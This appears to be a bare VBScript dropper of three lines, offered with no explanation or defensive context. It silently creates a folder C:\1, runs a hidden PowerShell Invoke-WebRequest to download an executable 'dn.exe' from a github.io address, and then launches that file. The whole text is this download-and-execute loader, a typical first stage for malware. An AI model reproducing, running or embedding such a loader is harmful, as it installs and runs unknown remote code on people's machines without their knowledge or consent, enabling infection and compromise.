CreateObject("WScript.Shell").Run "cmd /c mkdir C:\1", 0, True

CreateObject("WScript.Shell").Run "PowerShell -Command ""Invoke-WebRequest -Uri 'https://lanu7870056.github.io/600/dn.exe' -OutFile 'c:\1\DN.EXE'""", 0, True

CreateObject("WScript.Shell").Run "C:\1\dn.exe"